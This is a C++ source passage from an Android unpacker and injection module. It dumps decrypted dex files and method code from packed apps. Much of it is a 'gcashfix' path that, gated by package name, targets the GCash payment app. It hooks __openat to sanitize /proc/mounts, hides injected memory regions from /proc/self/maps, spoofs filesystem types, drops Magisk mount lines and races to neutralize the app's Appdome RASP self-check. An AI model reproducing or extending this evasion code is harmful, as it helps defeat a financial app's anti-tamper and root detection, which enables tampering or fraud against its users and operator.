        void *of = dlsym(RTLD_DEFAULT, "__openat");
        if (!of) {
            vector::native::ElfImage libc("libc.so");
            if (libc.IsValid()) {
                of = const_cast<void *>(libc.getSymbAddress<const void *>("__openat"));
                if (!of) of = const_cast<void *>(libc.getSymbAddress<const void *>("___openat"));
            }
        }
        if (of) {
            void *bk = kpm_inline_hooker(of, reinterpret_cast<void *>(&GcashOpenatHook));
            if (bk) { g_gc_orig_openat = reinterpret_cast<int (*)(int, const char *, int, int)>(bk);
                      LOGI("[gcashfix] traceless-hooked __openat @ {} (sanitize /proc/mounts)", of); }
            else LOGW("[gcashfix] kpm_inline_hooker(__openat) FAILED");
        } else {
            LOGW("[gcashfix] __openat symbol not found");
        }
    } else {
        LOGI("[gcashfix] __openat hook SKIPPED (gated off — avoids Vector dex-load self-interference)");
    }

    // Dump libloader's runtime-DECRYPTED 2nd-detection region (RE: exit site 0x386adc, encrypted
    // on disk) to logcat, for offline RE of what that inline-svc-self-kill check reads.
    {
        uintptr_t lb = FindLibBase("libloader.so");
        if (lb) {
            const unsigned char *p = reinterpret_cast<const unsigned char *>(lb + 0x386800);
            for (unsigned o = 0; o < 0x800; o += 32) {
                char hex[80];
                int n = 0;
                for (int j = 0; j < 32; j++) n += snprintf(hex + n, sizeof(hex) - n, "%02x", p[o + j]);
                LOGI("[gcashdump] +{:x} {}", 0x386800 + o, hex);
            }
        }
    }

    // Research dump of the transient Appdome shell libnyadgfpeuju.so — OFF by default. Leaving
    // foreign nya_*.bin files in GCash's own /data/data/.../cache is a filesystem footprint a
    // file-integrity RASP (Appdome edgeguard) can flag; a stealth backend must not litter the
    // target's private dir. Set persist.kpmhook.unpack.nyadump=1 to re-enable for offline RE.
    const int nyadump_on = PropInt("persist.kpmhook.unpack.nyadump", 0);
    int total_hidden = 0;
    for (int round = 0; round < 30; round++) {  // ~6s of coverage @200ms
        FILE *f = fopen("/proc/self/maps", "re");
        if (!f) break;
        char line[600];
        int this_round = 0;
        while (fgets(line, sizeof(line), f)) {
            // EARLY dump of the Appdome shell libnyadgfpeuju.so (transient — unmaps ~t+1.5 after it
            // maps+relocates libloader + runs the materialize-vs-withhold verdict). This worker runs
            // at zygote postAppSpecialize (t+0), in-process, so it can DIRECT-READ the region before
            // it unmaps — the 2nd-stage verdict native that late ptrace-attach always misses. Dump
            // while mapped (filename keyed by start addr; overwrites idempotently) to the app cache.
            if (nyadump_on && strstr(line, "libnyadgfpeuju")) {
                uintptr_t ns = 0, ne = 0; char np[8] = {0};
                if (sscanf(line, "%lx-%lx %7s", &ns, &ne, np) == 3 && np[0] == 'r' && ne > ns
                    && (ne - ns) <= 0x1000000) {
                    char op[160];
                    snprintf(op, sizeof(op),
                             "/data/data/com.globe.gcash.android/cache/nya_%lx_%c%c%c.bin",
                             (unsigned long) ns, np[0], np[1], np[2]);
                    FILE *of = fopen(op, "wb");
                    if (of) { fwrite(reinterpret_cast<const void *>(ns), 1, ne - ns, of); fclose(of);
                              LOGI("[nyadump] {} {:x}-{:x} {}", op, (unsigned long) ns, (unsigned long) ne, np); }
                }
            }
            if (!MapsLineIsInjected(line)) continue;
            uintptr_t start = 0, end = 0;
            if (sscanf(line, "%lx-%lx", &start, &end) != 2 || !start || end <= start) continue;
            // One hide at the VMA start (hidergn is expected VMA-granular). If a test shows a VMA
            // only partially hidden, switch to a per-page loop here.
            if (kpm_hide_region(reinterpret_cast<void *>(start))) {
                total_hidden++;
                this_round++;
            }
        }
        fclose(f);
        if (round == 0)
            LOGI("[gcashfix] maps-hide round0: hid {} injected VMA(s)", this_round);
        usleep(200 * 1000);
    }
    LOGI("[gcashfix] maps-hide done: {} page-hides total", total_hidden);
}

void WorkerMain(JavaVM *vm, Config cfg, std::string out_dir) {
    // GCash Ant-APSE neutralize: race to KPM-traceless-hook libloader's detect fn BEFORE its
    // ~2-7s self-check fires. Needs no JNI/ART -- run it first (the KPM gate is already set via
    // kpm_hook_set_process_name in StartIfEnabled) to win the race.
    if (cfg.gcash_fix) {
        RunGcashNeutralize(vm, cfg.gcash_off);
        return;
    }

    // Pre-attach settle delay. Some extraction shells (51job's s.h.e.l.l) run a startup routine
    // that maps a PRIVATE libart copy and inline-hooks ~7 libart functions into it — and that
    // routine faults SEGV_ACCERR (killing the app <1s in) if ANY concurrent JNI thread attach /
    // ART surface access happens WHILE it runs (reproducible: the crash fires the instant this
    // worker's AttachCurrentThread + art::Get() touch the runtime, before any hook is even
    // installed). Sleeping here BEFORE the first ART interaction lets that startup routine finish;
    // the worker then attaches/hooks against a settled runtime. Default 0 (no delay) preserves the
    // original behavior for every other packer. For interp/trigger capture the sign path is driven
    // AFTER this delay, so a late hook still catches it.
    int worker_delay = PropInt("persist.kpmhook.unpack.worker_delay_ms", 0);
    if (worker_delay > 0) {
        LOGI("[unpack] worker: pre-attach settle delay {}ms (let self-libart-patching packer finish "
             "startup before we touch ART)", worker_delay);
        for (int w = 0; w < worker_delay; w += 200) usleep(200 * 1000);
    }

    // Attach to the ART runtime so we hold a valid art::Thread* for the driver.
    JNIEnv *env = nullptr;
    if (vm->AttachCurrentThread(&env, nullptr) != JNI_OK || !env) {
        LOGW("[unpack] worker: AttachCurrentThread failed");
        return;
    }

    // openat traceless probe (frida-parallel). If set, this is the worker's WHOLE job -- install
    // the traceless openat hook, log distinct paths, exit. Kept isolated from the dump path so the
    // survival/capture experiment is clean (no choke hook, no maps burst, no dexfind).
    if (cfg.openat_probe) {
        RunOpenatProbe(cfg.openat_ms, cfg.openat_dobby);
        vm->DetachCurrentThread();
        return;
    }

    void *art_thread = env->functions->reserved3;  // TODO(P1): the real art::Thread* (JNIEnv cookie / __get_tls)

    static CodeItemSink sink;
    sink.Init(out_dir.c_str());

    // increment-2c: interpreter-point capture (FART-style) — the ONLY way to recover a side-cache /
    // DefineClass-restore extraction shell (dpt-shell), whose real CodeItems GetCodeItem (2b) can't
    // see. Hook art::interpreter::Execute FIRST (this fires near app startup, before the app runs
    // its own methods) and capture for a window while the app initializes + the operator drives it.
    // The structure dexes themselves are dumped by the dexfind pass below (same region keys), so the
    // offline splicer can graft the captured CodeItems back in.
    // Skip the standalone interp window when Tier-C invoke is on: invoke runs its OWN interp-capture
    // window (Execute hook) with active-invoke as the in-window driver (below), so a separate pass
    // here would just waste interp_ms and double-hook.
    if (cfg.interp && !cfg.invoke) {
        int interp_ms = PropInt("persist.kpmhook.unpack.interp_ms", 30000);
        size_t ncap = CaptureInterpreted(&sink, interp_ms);
        LOGI("[unpack] interp: {} method CodeItem(s) captured over {}ms", ncap, interp_ms);
    }

    // The CodeItem-restore choke is only useful for the active/per-method tiers; the P0-simple
    // whole-dex path is a /proc/self/maps scan (immune to libart inlining GetCodeItem).
    bool hooked = false;
    if (cfg.tier != Tier::kPassive) {
        hooked = InstallChokeHook(cfg.choke, cfg.stealth, &sink);
        if (!hooked) LOGW("[unpack] choke hook install failed; continuing with maps scan only");
        size_t driven = EnumerateAndDrive(cfg.tier, art_thread);
        LOGI("[unpack] worker: driven={} methods", driven);
    }

    // Packers decrypt lazily / in stages (Yidun, legu, ...) and some anti-root packers exit the
    // app within a few seconds. So scan IMMEDIATELY and repeatedly with a sub-second interval to
    // catch the decrypted dex(es) inside that brief window, whenever they materialize
    // (range-deduped -> already-dumped dexes are skipped cheaply). Props tune the burst.
    //
    // SKIP the burst when dexfind is on: (1) dexfind is strictly superior — it reaches every loaded
    // dex via ART (incl. header-mangled ones the scan can't validate), so the burst adds nothing;
    // (2) the burst's heavy page-by-page read + process-wide SIGSEGV fault-guard CONFLICTS with
    // signal/lazy-restore shells (dpt-shell crashed the app at pc=0 during the burst, but runs fine
    // under dexfind-only). dexfind's region reads touch only the few loaded-dex regions.
    if (!cfg.dexfind && !cfg.interp && !cfg.active_load && !cfg.invoke) {
        int rounds = PropInt("persist.kpmhook.unpack.rounds", 40);
        int interval_ms = PropInt("persist.kpmhook.unpack.interval_ms", 400);
        if (rounds < 1) rounds = 1;
        if (interval_ms < 1) interval_ms = 1;
        LOGI("[unpack] scanning {} round(s) every {}ms (immediate start)", rounds, interval_ms);
        for (int r = 0; r < rounds; r++) {
            sink.ScanProcessForDexes();                   // scan FIRST -> catch fast-exit packers
            if (r + 1 < rounds) usleep((useconds_t)interval_ms * 1000);
        }
    } else {
        LOGI("[unpack] dexfind/interp on -> skipping the whole-dex burst scan (superseded)");
    }

    // Direction-1 increment-1: per-class dex discovery. The whole-dex scan above MISSES dexes
    // whose in-memory header the packer mangles (NetEase Yidun extracts/loads its real classes.dex
    // in-memory with a corrupted header). This asks ART directly — VisitClasses -> GetClassDef
    // gives a pointer into each live dex -> dump the containing region header-agnostically. Run
    // AFTER the burst so the app has loaded its real classes; enumeration runs on a runnable app
    // thread (captured via a transient ClassLinker::FindClass hook).
    // Also run for interp mode: the per-class region dump gives the offline splicer its target dexes
    // (whose nop'd CodeItems the interp captures replace). interp-only skips the GetCodeItem trigger.
    if (cfg.dexfind || cfg.interp || cfg.active_load || cfg.invoke) {
        bool trig = cfg.dexfind && cfg.trigger;
        if (trig) {
            // Calibrate the ArtMethod ABI (size + mirror::Class.methods_ offset) so the finder can
            // enumerate per-class ArtMethods and force-restore their CodeItems (increment-2).
            if (art::CalibrateForMethodEnum(env)) {
                LOGI("[unpack] dexfind: ArtMethod ABI calibrated -> per-method trigger ON");
            } else {
                LOGW("[unpack] dexfind: ArtMethod ABI calibration failed -> dump-only");
                trig = false;
            }
        }
        int pre_ms = PropInt("persist.kpmhook.unpack.predelay_ms", 6000);
        size_t recovered = FindAndDumpClassDexes(&sink, env, 10000, trig, cfg.active_load,
                                                 cfg.traceless, pre_ms);
        LOGI("[unpack] dexfind: {} region(s) recovered (trigger={} activeload={})", recovered, trig,
             cfg.active_load);
    }

    // Tier-C (FART fartwithClassloader): reflectively invoke every app method/constructor to force a
    // RESTORE-ON-INVOKE extraction shell to refill each CodeItem. Runs AFTER the dexfind enumeration
    // (which published the class-defs + dumped the structure dexes) and INSIDE an interp-capture
    // window, so the restored CodeItems are grabbed live at art::interpreter::Execute. The offline
    // splicer grafts them back into the dumped structure dexes (same captures.txt format).
    if (cfg.invoke) {
        const void *const *defs = nullptr;
        size_t ndefs = GetEnumeratedClassDefs(&defs);
        if (!defs || ndefs == 0) {
            LOGW("[unpack] invoke: no enumerated class-defs (dexfind ART surface unresolved?); "
                 "skipping Tier-C active-invoke");
        } else {
            LOGI("[unpack] invoke: Tier-C over {} class-def(s), budget {}ms, residual {}ms", ndefs,
                 cfg.invoke_ms, cfg.invoke_residual_ms);
            size_t ncap = CaptureInterpreted(&sink, cfg.invoke_residual_ms, [&] {
                size_t inv = ActiveInvokeAllMethods(env, defs, ndefs, cfg.invoke_ms);
                LOGI("[unpack] invoke: driver invoked {} method(s)/ctor(s)", inv);
            });
            LOGI("[unpack] invoke: {} CodeItem(s) captured during active-invoke", ncap);
        }
    }

    sink.Flush();

    if (hooked) RemoveChokeHook();  // P0: one-shot
    vm->DetachCurrentThread();
    LOGI("[unpack] worker done: dex={} captures={}", sink.dex_count(), sink.capture_count());
}

Config ReadConfigFromProps() {
    Config c;
    c.enabled = PropIs("persist.kpmhook.unpack", '1');
    c.tier = ParseTier();
    c.stealth = PropIs("persist.kpmhook.unpack.stealth", '1');
    c.choke = ParseChoke();
    c.dexfind = PropIs("persist.kpmhook.unpack.dexfind", '1');
    c.trigger = PropIs("persist.kpmhook.unpack.trigger", '1');
    c.interp = PropIs("persist.kpmhook.unpack.interp", '1');
    c.active_load = PropIs("persist.kpmhook.unpack.activeload", '1');
    c.invoke = PropIs("persist.kpmhook.unpack.invoke", '1');
    c.invoke_ms = PropInt("persist.kpmhook.unpack.invoke_ms", 60000);
    c.invoke_residual_ms = PropInt("persist.kpmhook.unpack.invoke_residual_ms", 3000);
    c.traceless = PropIs("persist.kpmhook.unpack.traceless", '1');
    c.extout = PropIs("persist.kpmhook.unpack.extout", '1');
    c.openat_probe = PropIs("persist.kpmhook.unpack.openat", '1');
    c.openat_ms = PropInt("persist.kpmhook.unpack.openat_ms", 20000);
    c.openat_dobby = PropIs("persist.kpmhook.unpack.openat_dobby", '1');
    c.gcash_fix = PropIs("persist.kpmhook.unpack.gcashfix", '1');
    c.gcash_off = (unsigned long) PropInt("persist.kpmhook.unpack.gcashoff", 0x1d0bb0);
    return c;
}

}  // namespace

bool StartIfEnabled(JavaVM *vm, JNIEnv *env, const char *app_data_dir, const char *process_name) {
    (void)env;
    Config cfg = ReadConfigFromProps();
    // GCash override: persist.kpmhook.* props are UNREADABLE from the app process (read empty here
    // while `getprop` shows them set — SELinux/phoenix prop-hook), which would leave cfg.enabled=0 and
    // skip the whole gcashfix stack (maps-hide + do_exit auto-arm + dl_iterate hide). Force it on for
    // GCash by package name so the RASP neutralize always runs, prop-independent.
    // PREFIX match also covers GCash CHILD procs (com.globe.gcash.android:tools/:pushservice/...) —
    // they are Appdome-protected too; left with the Java-injection footprint they get detected -> fuse ->
    // wild-jump self-destruct crash-loop (RE 2026-09-28: children crashed @0x187b4ef4d8 while the
    // native-only main process survived). Give them the same native-only + gcashfix treatment.
    if (process_name && strncmp(process_name, "com.globe.gcash.android", 23) == 0) {
        cfg.enabled = true;
        cfg.gcash_fix = true;
    }
    if (!cfg.enabled) return false;  // default path: no-op
    if (!ProcessMatchesTarget(process_name)) return false;  // stealth=0 per-app gate
    if (!vm) {
        LOGW("[unpack] StartIfEnabled: no JavaVM");
        return false;
    }
    // Engage the KPM (identify this proc to its gate, arm ghost/fshide) ONLY when a run actually
    // uses a KPM path (traceless/stealth hooks, or the gcashfix/openat traceless probes). A
    // pure-Dobby unpack (interp/dexfind with stealth=0 traceless=0) needs NONE of this, and merely
    // TARGETING the process in the shpte KPM makes it PTE-manage this proc's libart pages — which
    // COLLIDES with packers that mmap/patch libart.so themselves (51job's s.h.e.l.l maps a private
    // libart and copies function prologues into it; the KPM-managed page then faults SEGV_ACCERR on
    // the packer's own write, killing the app at startup before any hook is even installed). So gate
    // the KPM engagement: a Dobby-only run leaves this proc off the KPM's radar entirely.
    const bool uses_kpm = cfg.stealth || cfg.traceless || cfg.gcash_fix || cfg.openat_probe;
    if (uses_kpm) {
        // Tell the KPM gate who we are BEFORE the worker calls kpm_inline_hooker (see the extern
        // decl above). Without this the openat/traceless path fails the gate and latches.
        kpm_hook_set_process_name(process_name);
        // Rev1-(1): host traceless clones VMA-less (enumeration-blind). Must precede the first
        // kpm_inline_hooker; affects regions created after. Auto-falls-back on a pre-0.6.2 KPM.
        kpm_hook_set_ghost(1);
        // fs-hide: spoof this process's statfs f_type (overlayfs->erofs) + drop overlay/magisk mount
        // lines, so the app's own root-detection can't catch the "hidden overlayfs" inconsistency.
        // Default on; disable with `resetprop persist.kpmhook.fshide 0`. Harmless no-op on <0.6.6 KPM.
        if (PropInt("persist.kpmhook.fshide", 1)) kpm_hook_fshide_enable();
    } else {
        LOGI("[unpack] pure-Dobby run (stealth=0 traceless=0) -> NOT engaging KPM (avoids "
             "PTE-page collision with self-libart-patching packers)");
    }
    // Output dir. Default = the app's INTERNAL data dir (/data/user/0/<pkg>/unpack). On a hardened
    // app with strict SELinux MLS categories (e.g. GCash), a locked-down su can't read those files
    // (can't relabel/setenforce), so pulling the dump fails. extout=1 writes to the app's EXTERNAL
    // dir instead (the app can write its own /storage/emulated/0/Android/data/<pkg>/files; root
    // reads the same bytes at /data/media/0/... which is media_rw_data_file with NO app categories,
    // so `adb pull` works). process_name == target here (exact-match gate), so it's the clean pkg.
    std::string out_dir;
    if (cfg.extout && process_name && process_name[0]) {
        out_dir = std::string("/storage/emulated/0/Android/data/") + process_name + "/files/vunpack";
    } else if (app_data_dir && app_data_dir[0]) {
        out_dir = std::string(app_data_dir) + "/unpack";
    } else {
        out_dir = "/data/local/tmp/unpack";
    }
    LOGI("[unpack] enabled: tier={} stealth={} choke={} dir={} -> spawning worker",
         static_cast<int>(cfg.tier), cfg.stealth, static_cast<int>(cfg.choke), out_dir.c_str());
    std::thread(WorkerMain, vm, cfg, std::move(out_dir)).detach();
    return true;
}

}  // namespace vector::native::unpack

#endif  // VECTOR_UNPACK_ENABLED
